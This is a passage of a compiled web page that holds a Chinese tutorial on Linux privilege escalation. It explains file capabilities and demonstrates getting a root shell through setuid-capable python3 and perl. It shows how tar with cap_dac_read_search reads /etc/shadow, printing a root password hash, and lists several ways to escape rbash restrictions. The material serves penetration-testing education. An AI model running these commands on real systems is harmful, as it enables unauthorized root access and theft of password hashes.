</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="capcability提权" tabindex="-1"><a class="header-anchor" href="#capcability提权" aria-hidden="true">#</a> capcability提权</h4><ul><li><p>capability翻译为能力的意思，linux中能力的概念和suid类似，是用来让普通用户也可以做超级用户的工作，从而设置的一个机制。</p></li><li><p>capability和suid的区别在于：suid是针对某个用户给权限，而capability针对的是某个程序。</p></li><li><p>capability可分割root权限，把root特权分割成不同的能力，然后给与普通用户不同的能力，每一种能力都代表着一种特权。下面是一些能力参考：</p><ul><li><p>- CAP_CHOWN:修改文件属主的权限</p><p>- CAP_DAC_OVERRIDE:忽略文件的DAC访问限制</p><p>- CAP_DAC_READ_SEARCH:忽略文件读及目录搜索的DAC访问限制</p><p>- CAP_FOWNER：忽略文件属主ID必须和进程用户ID相匹配的限制</p><p>- CAP_FSETID:允许设置文件的setuid位</p><p>- CAP_KILL:允许对不属于自己的进程发送信号</p><p>- CAP_SETGID:允许改变进程的组ID</p><p>- CAP_SETUID:允许改变进程的用户ID</p><p>- CAP_SETPCAP:允许向其他进程转移能力以及删除其他进程的能力</p><p>- CAP_LINUX_IMMUTABLE:允许修改文件的IMMUTABLE和APPEND属性标志</p><p>- CAP_NET_BIND_SERVICE:允许绑定到小于1024的端口</p><p>- CAP_NET_BROADCAST:允许网络广播和多播访问</p><p>- CAP_NET_ADMIN:允许执行网络管理任务</p><p>- CAP_NET_RAW:允许使用原始套接字</p><p>- CAP_IPC_LOCK:允许锁定共享内存片段</p><p>- CAP_IPC_OWNER:忽略IPC所有权检查</p><p>- CAP_SYS_MODULE:允许插入和删除内核模块</p><p>- CAP_SYS_RAWIO:允许直接访问/devport,/dev/mem,/dev/kmem及原始块设备</p><p>- CAP_SYS_CHROOT:允许使用chroot()系统调用</p><p>- CAP_SYS_PTRACE:允许跟踪任何进程</p><p>- CAP_SYS_PACCT:允许执行进程的BSD式审计</p><p>- CAP_SYS_ADMIN:允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等</p><p>- CAP_SYS_BOOT:允许重新启动系统</p><p>- CAP_SYS_NICE:允许提升优先级及设置其他进程的优先级</p><p>- CAP_SYS_RESOURCE:忽略资源限制</p><p>- CAP_SYS_TIME:允许改变系统时钟</p><p>- CAP_SYS_TTY_CONFIG:允许配置TTY设备</p><p>- CAP_MKNOD:允许使用mknod()系统调用</p><p>- CAP_LEASE:允许修改文件锁的FL_LEASE标志</p></li></ul></li><li><p>setcap命令用来设置能力，在设置程序能力时，有三个选项可选：</p><p>1.inheritable，简称i，表示是否可继承。</p><p>2.permitted，简称p，表示是否允许使用。</p><p>3.effective，简称e，表示特权是否有效。</p></li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>例如：
setcap cap_setuid+ep /home/python3 <span class="token comment">#表示home/python3这个程序添加了setuid能力，即改变进程uid的能力，+ep就表示能力有效，且允许使用。</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>getcat读取能力</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>例如：
getcap <span class="token parameter variable">-r</span> ./ <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null <span class="token comment">#查看当前目录有能力的程序。</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="python3" tabindex="-1"><a class="header-anchor" href="#python3" aria-hidden="true">#</a> Python3</h5><ul><li>当root用户使用capabilities为某个程序赋予能力，但赋予的能力过大则存在提权的可能。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>背景
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># which python3</span>
/usr/bin/python3
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># cp /usr/bin/python3 /home/test/python3</span>
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># setcap cap_setuid+ep python3</span>

提权过程
<span class="token number">1</span>.查看赋予的能力
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ getcap <span class="token parameter variable">-r</span> ./ <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
./python3 <span class="token operator">=</span> cap_setuid+ep
<span class="token number">2</span>.通过python调用uid为0的bash
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ ./python3 <span class="token parameter variable">-c</span> <span class="token string">&#39;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#39;</span>
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="perl-1" tabindex="-1"><a class="header-anchor" href="#perl-1" aria-hidden="true">#</a> perl</h5><ul><li>同理</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>背景
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># which perl</span>
/usr/bin/perl
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># cp /usr/bin/perl ./perl</span>
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># setcap cap_setuid+ep perl</span>

提权过程
<span class="token number">1</span>.查看赋予的能力
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ getcap <span class="token parameter variable">-r</span> ./ <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
./perl <span class="token operator">=</span> cap_setuid+ep
<span class="token number">2</span>.通过perl调用uid为0的bash
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ ./perl <span class="token parameter variable">-e</span> <span class="token string">&#39;use POSIX (setuid); POSIX::setuid(0); exec &quot;/bin/bash&quot;;&#39;</span>
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="tar" tabindex="-1"><a class="header-anchor" href="#tar" aria-hidden="true">#</a> tar</h5><ul><li>同理，但该命令无法直接调用bash，但可以通过压缩shadow文件来破解shadow密码。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>背景
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># which tar</span>
/usr/bin/perl
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># cp /usr/bin/tar ./tar</span>
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># setcap cap_dac_read_search+ep tar</span>

提权过程
<span class="token number">1</span>.查看赋予的能力
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ getcap <span class="token parameter variable">-r</span> ./ <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
./tar <span class="token operator">=</span> cap_dac_read_search+ep
<span class="token number">2</span>.将/etc/shadow文件压缩到当前目录，并解压。解压后shadow文件没有任何权限需要添加权限才能执行。
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ ./tar <span class="token parameter variable">-cvf</span> shadow.tar /etc/shadow
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ ./tar <span class="token parameter variable">-xvf</span> shadow.tar
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">chmod</span> <span class="token number">777</span> etc/shadow
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">cat</span> etc/shadow <span class="token operator">|</span> <span class="token function">grep</span> root
root:<span class="token variable">$6</span><span class="token variable">$rAzUs4O1gaQ2Ucpa</span><span class="token variable">$72sYgw1AjcSbRd6cnOAbzlnCIbXb</span>/KsEz7CZSsW1nG8G6Gx8xR6BGw0udsNIXl1eIxnyYbhgUuVHjgwYIM5TS/::0:99999:7:::
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="rbash绕过" tabindex="-1"><a class="header-anchor" href="#rbash绕过" aria-hidden="true">#</a> rbash绕过</h4><ul><li>rbash是Restricted bash缩写，即受限制的bash。管理员可通过指定普通用户的bash为rbash，以此来限制相关操作。在rbash中，很多行为和命令都会被受到限制。</li><li>PS：这种确切说不属于提权，只是绕过rbash的限制，因为绕过后身份依旧是当前的普通账户。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>环境搭建
<span class="token number">1</span>.将test用户的shell设置为rbash
root@hzy-virtual-machine:/home/hzy<span class="token comment"># cat /etc/passwd | grep test</span>
test:x:1001:1001::/home/test:/bin/sh
root@hzy-virtual-machine:/home/hzy<span class="token comment"># usermod -s /bin/rbash test</span>
root@hzy-virtual-machine:/home/hzy<span class="token comment"># cat /etc/passwd | grep test</span>
test:x:1001:1001::/home/test:/bin/rbash
test@hzy-virtual-machine:/home/hzy$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$SHELL</span>
/bin/rbash
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="vi绕过" tabindex="-1"><a class="header-anchor" href="#vi绕过" aria-hidden="true">#</a> vi绕过</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>绕过过程：
<span class="token function">vi</span>
:set <span class="token assign-left variable">shell</span><span class="token operator">=</span>/bin/sh
:shell
<span class="token builtin class-name">cd</span> /etc
<span class="token builtin class-name">pwd</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="ed绕过" tabindex="-1"><a class="header-anchor" href="#ed绕过" aria-hidden="true">#</a> ed绕过</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>绕过过程：
test@hzy-virtual-machine:/home/hzy$ ed
<span class="token operator">!</span><span class="token string">&#39;/bin/sh&#39;</span>
$ <span class="token builtin class-name">pwd</span>
/home/hzy
$ <span class="token builtin class-name">cd</span> /etc
$ <span class="token builtin class-name">pwd</span>
/etc
$
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="sh、bash、dash绕过" tabindex="-1"><a class="header-anchor" href="#sh、bash、dash绕过" aria-hidden="true">#</a> sh、bash、dash绕过</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>绕过过程：
直接输入sh、bash、dash调出命令行
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="python、perl绕过" tabindex="-1"><a class="header-anchor" href="#python、perl绕过" aria-hidden="true">#</a> python、perl绕过</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>test@hzy-virtual-machine:/home/hzy$ python3 <span class="token parameter variable">-c</span> <span class="token string">&#39;import os; os.system(&quot;/bin/sh&quot;);&#39;</span>

test@hzy-virtual-machine:/home/hzy$ perl <span class="token parameter variable">-e</span> <span class="token string">&#39;system(&quot;/bin/sh&quot;);&#39;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="awk绕过" tabindex="-1"><a class="header-anchor" href="#awk绕过" aria-hidden="true">#</a> awk绕过</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>test@hzy-virtual-machine:/home/hzy$ <span class="token function">awk</span> <span class="token string">&#39;BEGIN {system(&quot;/bin/sh&quot;)}&#39;</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="more绕过" tabindex="-1"><a class="header-anchor" href="#more绕过" aria-hidden="true">#</a> more绕过</h5><ul><li>必须存在一个文件可读，有权限读，还有有翻页功能才行。</li><li>类似像more的命令如less、man等。</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>more .bashrc
!&#39;sh&#39;
cd /
pwd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="ssh登录绕过" tabindex="-1"><a class="header-anchor" href="#ssh登录绕过" aria-hidden="true">#</a> ssh登录绕过</h5><ul><li>ssh进行远程登录时，可通过t参数来强制分配给自己伪终端，指定强制分配给自己bash，然后指定--noprofile参数。bash默认允许时会调用当前用户的bashrc等配置，该参数添加后，bash启动不会读取当前用户的默认配置。</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>test@hzy-virtual-machine:/home/hzy$ ssh test@192.168.0.142 -t &quot;bash --noprofile&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,113);function w(E,C){const a=p("ExternalLinkIcon");return l(),o("div",null,[d,n("p",null,[s("linux-exploit-suggester-2："),n("a",v,[s("https://github.com/jondonas/linux-exploit-suggester-2"),e(a)])]),n("p",null,[s("linux-kernel-exploits："),n("a",m,[s("https://github.com/SecWiki/linux-kernel-exploits"),e(a)])]),b,n("p",null,[n("a",k,[s("https://cxsecurity.com/"),e(a)])]),h,g,f,n("p",null,[s("LinuEnum："),n("a",_,[s("https://github.com/rebootuser/LinEnum"),e(a)])]),n("p",null,[s("BeRoot："),n("a",x,[s("https://github.com/AlessandroZ/BeRoot"),e(a)])]),n("p",null,[s("Linux-smart-enumeration："),n("a",L,[s("https://github.com/diego-treitos/linux-smart-enumeration"),e(a)])]),A])}const S=i(r,[["render",w],["__file","Linux提权.html.vue"]]);export{S as default};
